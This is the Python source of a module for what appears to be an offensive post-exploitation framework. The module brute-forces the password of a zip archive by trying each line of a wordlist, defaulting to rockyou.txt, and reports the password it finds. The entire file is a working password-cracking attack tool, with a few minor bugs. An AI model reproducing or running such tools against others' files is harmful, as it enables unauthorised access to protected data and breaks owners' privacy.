MODULE_TYPE = "postexploit"
import zipfile
import optparse
from threading import Thread
from collections import OrderedDict
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'ZipFile Password Bruter ',
            'Rank':'Good',
            'Platform':'Windows/Linux/Macos',
            'architectures':'x86/64 bit processors',
            'Description': 'Bruteforces zipFile passwords given a wordlistFile',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
                ('ZIP_FILE', ('', True, 'zip file path')),
                ('WORDLIST', ('/usr/share/wordlists/rockyou.txt', True, 'Wordlist path'))
                ])
                }
    def help(self):
        print("Usage: set ZIP_FILE <path/to/pdf> | set WORDLIST <path/to/file> then run")    	    
    def execute(self):
        zip_file = self.info['Options']['ZIP_FILE'][0]
        wordlist = self.info['Options']['WORDLIST'][0]
        zFile = zipfile.ZipFile(zip_file)
        passFile = open(wordlist)
        total = sum(1 for _ in passFile)
        passFile.seek(0)
        with open(wordlist) as f:
        			total = sum(1 for _ in f)
        			f.seek(0)
        			for i, lines in enumerate(f,1):
        				print(f"Attempts: {lines}", end="\r")
        				password = lines.strip('\n')
        				try:
        					zFile.extractall(pwd=password.encode())
        					print ('[+] Password Found :  ' + password + '\n')
        					return
        				except Exception as e:
        					pass
        return "[+] cracking zip password ..."
    